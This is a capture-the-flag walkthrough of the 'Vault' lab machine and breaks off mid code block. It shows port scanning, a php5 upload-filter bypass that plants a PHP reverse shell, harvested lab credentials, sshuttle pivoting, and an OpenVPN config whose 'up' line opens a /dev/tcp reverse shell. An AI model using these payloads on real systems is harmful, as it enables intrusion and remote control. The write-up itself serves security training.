I"<p>Vault is medium to hard difficulty machine, which requires bypassing host and file upload restrictions, tunneling, creating malicious OpenVPN configuration files and PGP decryption.</p>
<h1 id="reconnaissance">Reconnaissance</h1>
<h2 id="masscan--nmap">Masscan + Nmap</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>masscan <span class="nt">-p1-65535</span>,U:1-65535 <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">--rate</span><span class="o">=</span>5000 <span class="nt">-e</span> tun0 | <span class="nb">tee </span>masscan.out
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Parse those ports to nmap:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>masscan.out |awk <span class="s1">'{ print $4 }'</span> | <span class="nb">sed</span> <span class="s1">'s/\/tcp//;s/\/udp//'</span> | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed</span> <span class="s1">'s/,$//'</span><span class="si">)</span>
nmap <span class="nt">-v</span> <span class="nt">-sVC</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-p</span> <span class="nv">$ports</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-oN</span> nmap-fullscan.out
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="http">HTTP</h2>
<ul>
  <li>Fuzzing with <code class="language-plaintext highlighter-rouge">ffuf</code> didn’t give anything.</li>
  <li>Homepage gives this message
    <blockquote>
      <p>Welcome to the Slowdaddy web interface
We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe.
We are proud to announce our first client: Sparklays (Sparklays.com still under construction)</p>
    </blockquote>
  </li>
  <li>Tried adding <code class="language-plaintext highlighter-rouge">sparklays.com</code> as vhost, didn’t work.</li>
</ul>

<h3 id="scraping-words-with-cewl">Scraping words with Cewl</h3>
<p>Fetching all those words in lowercase to a list:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>cewl http://sparklays.com/ <span class="nt">--with-numbers</span> <span class="nt">--lowercase</span>  <span class="o">&gt;</span> cewl-list
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Fuzzing:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://sparklays.com/FUZZ <span class="nt">-w</span> cewl-list

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://sparklays.com/FUZZ
 :: Wordlist         : FUZZ: cewl-list
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

sparklays               [Status: 301, Size: 318, Words: 20, Lines: 10]
:: Progress: [32/32] :: Job [1/1] :: 13 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p>But when I try to access <code class="language-plaintext highlighter-rouge">sparklays</code>, it says forbidden.</p>

<h1 id="shell-as-www-data">Shell as www-data</h1>
<p>Let’s fuzz to check if anything’s inside <code class="language-plaintext highlighter-rouge">sparklays</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://sparklays.com/sparklays/ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> php,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher                    ver: 2.3.1
───────────────────────────┬──────────────────────
     Target Url            │ http://sparklays.com/sparklays/
     Threads               │ 50
     Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
     Status Codes          │ <span class="o">[</span>200, 204, 301, 302, 307, 308, 401, 403, 405]
     Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
     User-Agent            │ feroxbuster/2.3.1
     Config File           │ /etc/feroxbuster/ferox-config.toml
     Extensions            │ <span class="o">[</span>php, html]
     Recursion Depth       │ 4
     New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press <span class="o">[</span>ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        3l        2w       16c http://sparklays.com/sparklays/login.php
200       13l       38w      615c http://sparklays.com/sparklays/admin.php
301        9l       28w      325c http://sparklays.com/sparklays/design
301        9l       28w      333c http://sparklays.com/sparklays/design/uploads
200        3l        8w       72c http://sparklays.com/sparklays/design/design.html
</pre></td></tr></tbody></table></code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">login.php</code> says “access denied”</li>
  <li><code class="language-plaintext highlighter-rouge">admin.php</code> gives a login page</li>
  <li><code class="language-plaintext highlighter-rouge">design</code> says forbidden</li>
  <li><code class="language-plaintext highlighter-rouge">/design/uploads</code> says forbidden</li>
  <li><code class="language-plaintext highlighter-rouge">/design/design.html</code> says “Design Settings <a href="http://sparklays.com/sparklays/design/changelogo.php">Change Logo</a>” redirects to <a href="http://sparklays.com/sparklays/design/changelogo.php">http://sparklays.com/sparklays/design/changelogo.php</a> which gives a file upload option.</li>
</ul>

<p>I tried uploading file with extension <code class="language-plaintext highlighter-rouge">php</code>, didn’t work. 
Even <code class="language-plaintext highlighter-rouge">php3, php4, phtml</code> didn’t work. But <code class="language-plaintext highlighter-rouge">php5</code> worked.</p>

<p>Uploaded pentest-monkey reverse shell in <code class="language-plaintext highlighter-rouge">php5</code> extension and accessed it at: <a href="http://sparklays.com/sparklays/design/uploads/phprev.php5">http://sparklays.com/sparklays/design/uploads/phprev.php5</a>
Got shell:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>rlwrap nc <span class="nt">-lnvp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.25] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.109] 41398
Linux ubuntu 4.13.0-45-generic <span class="c">#50~16.04.1-Ubuntu SMP Wed May 30 11:18:27 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>
 12:50:31 up 1 day,  1:38,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1291<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@ubuntu:/<span class="err">$</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="checking-web-backend">Checking web backend</h2>
<h3 id="bypass-login-form">Bypass login form</h3>
<p><code class="language-plaintext highlighter-rouge">admin.php</code>:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="n">dave</span><span class="o">@</span><span class="n">ubuntu</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">sparklays</span><span class="err">$</span> <span class="n">cat</span> <span class="n">admin</span><span class="mf">.</span><span class="n">php</span>
<span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"container"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">form</span> <span class="n">action</span> <span class="o">=</span><span class="s2">"admin.php"</span> <span class="n">method</span><span class="o">=</span><span class="s2">"GET"</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">h2</span> <span class="n">class</span><span class="o">=</span><span class="s2">"form-signin-heading"</span><span class="o">&gt;</span><span class="nc">Please</span> <span class="nc">Login</span><span class="o">&lt;/</span><span class="n">h2</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"input-group"</span><span class="o">&gt;</span>
          <span class="o">&lt;</span><span class="n">span</span> <span class="n">class</span><span class="o">=</span><span class="s2">"input-group-addon"</span> <span class="n">id</span><span class="o">=</span><span class="s2">"basic-addon1"</span><span class="o">&gt;</span><span class="n">username</span><span class="o">&lt;/</span><span class="n">span</span><span class="o">&gt;</span>
          <span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s2">"text"</span> <span class="n">name</span><span class="o">=</span><span class="s2">"username"</span> <span class="n">class</span><span class="o">=</span><span class="s2">"form-control"</span> <span class="n">placeholder</span><span class="o">=</span><span class="s2">"username"</span> <span class="n">required</span><span class="o">&gt;</span>
        <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">label</span> <span class="k">for</span><span class="o">=</span><span class="s2">"inputPassword"</span> <span class="n">class</span><span class="o">=</span><span class="s2">"sr-only"</span><span class="o">&gt;</span><span class="nc">Password</span><span class="o">&lt;/</span><span class="n">label</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s2">"password"</span> <span class="n">name</span><span class="o">=</span><span class="s2">"password"</span> <span class="n">id</span><span class="o">=</span><span class="s2">"inputPassword"</span> <span class="n">class</span><span class="o">=</span><span class="s2">"form-control"</span> <span class="n">placeholder</span><span class="o">=</span><span class="s2">"Password"</span> <span class="n">required</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">button</span> <span class="n">class</span><span class="o">=</span><span class="s2">"btn btn-lg btn-primary btn-block"</span> <span class="n">type</span><span class="o">=</span><span class="s2">"submit"</span><span class="o">&gt;</span><span class="nc">Login</span><span class="o">&lt;/</span><span class="n">button</span><span class="o">&gt;</span>
      <span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>
<span class="o">&lt;?</span><span class="n">php</span>
<span class="nv">$username</span> <span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"username"</span><span class="p">];</span>
<span class="nv">$domain</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"SERVER_NAME"</span><span class="p">];</span>
<span class="nv">$requri</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_URI'</span><span class="p">];</span>
<span class="k">if</span> <span class="p">((</span><span class="nv">$domain</span> <span class="o">==</span> <span class="s2">"localhost"</span><span class="p">)</span> <span class="p">)</span>  <span class="p">{</span>
   <span class="nb">Header</span><span class="p">(</span> <span class="s2">"Welcome Dave"</span> <span class="p">);</span>
   <span class="nb">header</span><span class="p">(</span><span class="s2">"location: sparklays-local-admin-interface-0001.php
  "</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">else</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$username</span> <span class="o">==</span> <span class="s2">"dave"</span><span class="p">))</span> <span class="p">{</span>
  <span class="nb">setcookie</span><span class="p">(</span><span class="n">sparklaysdatastorage</span><span class="mf">.</span><span class="n">htb</span><span class="o">-</span><span class="n">unbreakable</span><span class="o">-</span><span class="n">cookie</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>This shows how even without fuzzing we could’ve accessed upload form. 
if domain is equal to <code class="language-plaintext highlighter-rouge">localhost</code> it redirects and gives a “Welcome Dave”:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="nt">-I</span> <span class="s1">'http://10.10.10.109/sparklays/admin.php?username=admin&amp;password=admin'</span>
HTTP/1.1 200 OK
Date: Sat, 04 Sep 2021 08:29:24 GMT
Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8

<span class="nv">$ </span>curl <span class="nt">-I</span> <span class="nt">-H</span> <span class="s1">'Host: localhost'</span> <span class="s1">'http://10.10.10.109/sparklays/admin.php?username=admin&amp;password=admin'</span> <span class="nt">-L</span>
HTTP/1.1 302 Found
Date: Sat, 04 Sep 2021 09:38:19 GMT
Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
location: sparklays-local-admin-interface-0001.php
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8

HTTP/1.1 200 OK
Date: Sat, 04 Sep 2021 09:38:20 GMT
Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="bypass-upload-form">Bypass upload form</h3>
<p><code class="language-plaintext highlighter-rouge">changelogo.php</code>:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'submit'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$target</span> <span class="o">=</span> <span class="s2">"uploads/"</span><span class="p">;</span> <span class="c1">//make sure to create a folder named 'uploads' and put it in the same directory that upload.php (this script) is in</span>
        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">];</span>
        <span class="nv">$tmp_dir</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">];</span>

                                                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/(gif|jpe?g|png|csv|php5)$/i'</span><span class="p">,</span> <span class="nv">$file_name</span><span class="p">)</span> <span class="c1">//set permissible file types</span>
                                                                                  <span class="p">)</span>
                                                        <span class="p">{</span>
                                                                <span class="k">echo</span> <span class="s2">"sorry that file type is not allowed"</span><span class="p">;</span>
                                                        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                                                <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmp_dir</span><span class="p">,</span> <span class="nv">$target</span> <span class="mf">.</span> <span class="nv">$file_name</span><span class="p">);</span>
                                                <span class="k">echo</span> <span class="s2">"The file was uploaded successfully&lt;br&gt;&lt;br&gt;"</span><span class="p">;</span>
                                        <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>This clearly shows how only files with extensions <code class="language-plaintext highlighter-rouge">gif, jpg, jpeg, png, csv, php5</code> are allowed.</p>

<h1 id="getting-user-dave">Getting user dave</h1>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>www-data@ubuntu:~/Desktop<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 12
<span class="nt">-rw-rw-r--</span> 1 alex alex 14 Jul 17  2018 key
<span class="nt">-rw-rw-r--</span> 1 alex alex 74 Jul 17  2018 Servers
<span class="nt">-rw-rw-r--</span> 1 alex alex 20 Jul 17  2018 ssh

www-data@ubuntu:~/Desktop<span class="nv">$ </span><span class="nb">cat </span>key
itscominghome

www-data@ubuntu:~/Desktop<span class="nv">$ </span><span class="nb">cat </span>Servers
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x

www-data@ubuntu:~/Desktop<span class="nv">$ </span><span class="nb">cat </span>ssh
dave
Dav3therav3123
</pre></td></tr></tbody></table></code></pre></div></div>

<ul>
  <li>Got password for dave <code class="language-plaintext highlighter-rouge">Dav3therav3123</code></li>
  <li>DNS + Configurator at <code class="language-plaintext highlighter-rouge">192.168.122.4</code></li>
  <li>Firewall at - <code class="language-plaintext highlighter-rouge">192.168.122.5</code></li>
  <li>Vault at <code class="language-plaintext highlighter-rouge">X</code></li>
  <li>Some key <code class="language-plaintext highlighter-rouge">itscominghome</code></li>
</ul>

<h1 id="enumerating-network-192168122024">Enumerating network 192.168.122.0/24</h1>
<p>If I list network interfaces with <code class="language-plaintext highlighter-rouge">ip addr</code>, I’m on the original host and not a container.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre></td><td class="rouge-code"><pre>dave@ubuntu:~<span class="nv">$ </span>ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
    <span class="nb">link</span>/ether 00:50:56:b9:a6:53 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.109/24 brd 10.10.10.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb9:a653/64 scope <span class="nb">link
       </span>valid_lft forever preferred_lft forever
3: virbr0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000
    <span class="nb">link</span>/ether fe:54:00:17:ab:49 brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
       valid_lft forever preferred_lft forever
4: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000
    <span class="nb">link</span>/ether 52:54:00:ff:fd:68 brd ff:ff:ff:ff:ff:ff
5: vnet0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master virbr0 state UNKNOWN group default qlen 1000
    <span class="nb">link</span>/ether fe:54:00:17:ab:49 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::fc54:ff:fe17:ab49/64 scope <span class="nb">link
       </span>valid_lft forever preferred_lft forever
6: vnet1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master virbr0 state UNKNOWN group default qlen 1000
    <span class="nb">link</span>/ether fe:54:00:3a:3b:d5 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::fc54:ff:fe3a:3bd5/64 scope <span class="nb">link
       </span>valid_lft forever preferred_lft forever
7: vnet2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master virbr0 state UNKNOWN group default qlen 1000
    <span class="nb">link</span>/ether fe:54:00:e1:74:41 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::fc54:ff:fee1:7441/64 scope <span class="nb">link
       </span>valid_lft forever preferred_lft forever
8: vnet3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master virbr0 state UNKNOWN group default qlen 1000
    <span class="nb">link</span>/ether fe:54:00:c6:70:66 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::fc54:ff:fec6:7066/64 scope <span class="nb">link
       </span>valid_lft forever preferred_lft forever
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="finding-live-hosts">Finding live hosts</h2>
<p>I transferred <code class="language-plaintext highlighter-rouge">nmap</code> standalone binary to the box.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>dave@ubuntu:~<span class="nv">$ </span>./nmap 192.168.122.0/24 <span class="nt">-sn</span> | <span class="nb">grep</span> <span class="nt">-v</span> down

Starting Nmap 6.49BETA1 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2021-09-04 00:48 PDT
Cannot find nmap-payloads. UDP payloads are disabled.
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using <span class="nt">--system-dns</span> or specify valid servers with <span class="nt">--dns-servers</span>
Nmap scan report <span class="k">for </span>192.168.122.1
Host is up <span class="o">(</span>0.0018s latency<span class="o">)</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>192.168.122.4
Host is up <span class="o">(</span>0.00074s latency<span class="o">)</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>192.168.122.5
Host is up <span class="o">(</span>0.00084s latency<span class="o">)</span><span class="nb">.</span>
Nmap <span class="k">done</span>: 256 IP addresses <span class="o">(</span>3 hosts up<span class="o">)</span> scanned <span class="k">in </span>2.50 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Scanning <code class="language-plaintext highlighter-rouge">192.168.122.4</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>dave@ubuntu:~<span class="nv">$ </span>./nmap 192.168.122.4 <span class="nt">-Pn</span> <span class="nt">-p-</span>

Starting Nmap 6.49BETA1 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2021-09-04 00:52 PDT
Unable to find nmap-services!  Resorting to /etc/services
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using <span class="nt">--system-dns</span> or specify valid servers with <span class="nt">--dns-servers</span>
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report <span class="k">for </span>192.168.122.4
Host is up <span class="o">(</span>0.0067s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>23.07 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="pivoting-using-sshuttle">Pivoting using sshuttle</h1>
<p>I can use <code class="language-plaintext highlighter-rouge">sshuttle</code> for pivoting as I’ve SSH login on the box.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>sshpass <span class="nt">-p</span> <span class="s1">'Dav3therav3123'</span> sshuttle <span class="nt">-r</span> dave@sparklays.com 192.168.122.0/24
c : Connected to server. 
</pre></td></tr></tbody></table></code></pre></div></div>
<h2 id="nmap-scripts-on-1921681224">Nmap scripts on 192.168.122.4</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sVC</span> <span class="nt">-Pn</span> <span class="nt">-sT</span> 192.168.122.4 <span class="nt">-p</span> 22,80
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-04 13:32 IST
Nmap scan report <span class="k">for </span>192.168.122.4
Host is up <span class="o">(</span>0.00020s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 ec:35:16:1f:31:cf:db:78:bb:ff:bd:e5:00:1b:d4:c5 <span class="o">(</span>RSA<span class="o">)</span>
|   256 f1:60:14:b9:da:53:80:57:53:a6:7b:44:97:f6:b5:6e <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 54:05:ca:f3:c2:27:ee:db:70:d4:01:0f:ad:8e:23:5d <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.44 seconds
</span></pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="apache-webserver">Apache webserver</h2>
<p>I can even access that webserver.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.122.4/ | html2text
<span class="k">******</span> Welcome to the Sparklays DNS Server <span class="k">******</span>
Click here to modify your DNS Settings
Click here to <span class="nb">test </span>your VPN Configuration
</pre></td></tr></tbody></table></code></pre></div></div>
<h1 id="openvpn-config-revshell-on-19216814">OpenVPN config revshell on 192.168.1.4</h1>
<p>Click here to test your VPN Configuration redirects to <code class="language-plaintext highlighter-rouge">/vpnconfig.php</code>.</p>

<p>Google gives this blog: <a href="https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da">https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da</a>
It tells how <code class="language-plaintext highlighter-rouge">up</code> can be used to used to execute commands.</p>

<p>This is the payload to use:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>remote 192.168.1.245
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
up "/bin/bash -c '/bin/bash -i &gt; /dev/tcp/192.168.1.218/8181 0&lt;&amp;1 2&gt;&amp;1&amp;'"
</pre></td></tr></tbody></table></code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">remote</code> IP, <code class="language-plaintext highlighter-rouge">ifconfig</code> can be anything</li>
  <li><code class="language-plaintext highlighter-rouge">dev</code> interface name should be different than interfaces already on the box. (Use tun1, tun2, .. change interface everytime you run a payload )</li>
</ul>

<p>To get the shell on my box, I’ll remote forward port <code class="language-plaintext highlighter-rouge">4444</code> on <code class="language-plaintext highlighter-rouge">10.10.10.109</code> to my <code class="language-plaintext highlighter-rouge">4444</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
